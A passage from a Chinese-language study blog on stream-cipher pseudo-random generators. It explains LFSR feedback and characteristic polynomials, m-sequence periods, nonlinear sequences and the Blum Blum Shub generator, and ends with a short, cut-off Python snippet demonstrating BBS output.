encoding="application/x-tex">z_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的值会传到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上。而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">z2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord">2</span></span></span></span>的值是由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">z_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的值相与得到的，这就是LSFR中的<code>feedback</code>。</p><p>一开始这三个寄存器中的初始值叫做<code>seed</code>种子。</p><p>这个实例比较简单，如果寄存器再多一些就比较复杂了，因为每个寄存器都可能参与反馈，也可能不参与，我们需要一个简单的方法来让简化。</p><p>这里引入反馈系数。</p><p><img src="https://upyun.wuuconix.link/image-20211007124519013.png" alt="反馈系数" /></p><p>每一个寄存器都对应一个反馈系数，来代表它有没有参与反馈。</p><p>这里的反馈实际都是反馈到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">z_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>这个寄存器的下一个状态，也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>k</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">k_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>了。因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">z_{n-2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">z_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的寄存器都是前一个寄存器移位下来的。</p><p>我们可以写出这样的反馈式子</p><p><img src="https://upyun.wuuconix.link/image-20211007125536458.png" alt="反馈" /></p><p>然后我们呢可以把这个式子转化为一个对应的特征多项式</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>+</mo><msub><mi>c</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>x</mi><mo>+</mo><msub><mi>c</mi><mrow><mi>j</mi><mo>−</mo><mn>2</mn></mrow></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>c</mi><mrow><mi>j</mi><mo>−</mo><mi>n</mi></mrow></msub><msup><mi>x</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">p(x)=1+c_{j-1}x+c_{j-2}x^2+..+c_{j-n}x^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1002159999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9504999999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></p><p>然后我们来思考一下LSFR的周期。</p><p>首先，我们很容器想到一个具体的LSFR是有周期上线的，因为n个寄存器，最多有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span>中可能性，而其中全零是不可能的，不然就一直全零，肯定不是随机序列了嘛233，所以周期最大为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211007130050250.png" alt="周期example" /></p><p>这个LSFR实例就达到了最大周期<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>3</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^3-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。值得注意的是，因为LSFR只是一个伪随机数发生器，它实际上产生的随机数序列为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0010111</mn><mtext> </mtext><mn>0010111</mn><mtext> </mtext><mn>0010111</mn></mrow><annotation encoding="application/x-tex">0010111\ 0010111\ 0010111</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mspace"> </span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mspace"> </span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span></span></span></span>。周期为7。</p><p>m-序列：由LSFR产生的最大长度序列是m-序列，结合上面的结论，m序列的周期是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。并且它满足Golomb随机性检测。在一个周期内，0比1的个数少1个。</p><p>定理：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{a_i\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>是m-序列当且仅当它的特征多项式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>是本原多项式</p><p>定义：如果p(x)的次数为n，且其周期为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>则称p(x)为本原多项式。</p><p>定义：设p(x)为GF（2）上的多项式，使得式子<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><msup><mi>x</mi><mi>p</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p(x)|x^p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>成立的最小正整数p为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>的周期</p><p>这里实际上对<code>周期</code>这个概念做了拓展，让一个多项式也有了周期。</p><h2 id="非线性序列"><a class="markdownIt-Anchor" href="#非线性序列"></a> 非线性序列</h2><p>LSFR做到操作是抑或，属于线性操作，如果我们把这种操作改编为非线性的，实际上就可以产生出非线性序列。</p><p><img src="https://upyun.wuuconix.link/image-20211007132052501.png" alt="非线性" /></p><p>它有一下特征：</p><ol><li>输出序列的周期为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span> *？</li><li>最大长度序列是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>−</mo><mi mathvariant="normal">序</mi><mi mathvariant="normal">列</mi></mrow><annotation encoding="application/x-tex">M-序列</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span></span></span></span></li><li>M-序列有很好的随机性质</li><li>M-序列的个数是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><msup><mn>2</mn><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">2^{2^{n-1}-n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9869199999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></li><li>非线性函数是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><msup><mn>2</mn><mi>n</mi></msup></msup><mo>−</mo><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^{2^n}-2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.96331em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.87998em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></li></ol><p>对非线性序列的研究还在初级阶段</p><p>实际应用中的非线性序列（用m-序列做为驱动序列）</p><ol><li>非线性混合序列</li><li>钟控序列</li></ol><p>非线性混合序列：</p><p>它实际上就是把n个LSFR的输出进行非线性混合。</p><p><img src="https://upyun.wuuconix.link/image-20211007132609824.png" alt="非线性混合序列" /></p><p>钟控序列：</p><p>引入了时钟，看不懂了233</p><h2 id="blum-blum-shub发生器"><a class="markdownIt-Anchor" href="#blum-blum-shub发生器"></a> Blum Blum Shub发生器</h2><p>BBS发生器基于数论中的二次剩余问题。</p><p>挺简单的，开局选两个大素数p和q。得到<code>n=pq</code>。</p><p>然后选一个和n互素的随机数x。</p><p>然后得到bbs初始输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_0=x^2(mod\  n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p>然后我们就根据这些x的二进制的最低位来生成01伪随机序列。注意<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的二进制最低位没有加入到输出中。</p><p><img src="https://upyun.wuuconix.link/image-20211007134917655.png" alt="bbs" /></p><p>这里输出99位测试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">9788476140853110794168855217413715781961</span><br>x=<span class="hljs-number">873245647888478349013</span><br>prn = <span class="hljs-string">&quot;&quot;</span><br>x = x**<span class="hljs-number">2</span> % n  <span class="hljs-comment">#x0的二进制最后一位不算入随机数序列中</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        x = x**<span class="hljs-number">2</span> % n<br>        prn += <span class="hljs-built_in">bin</span>(x)[-<span class="hljs-number">1</span>]<br><span 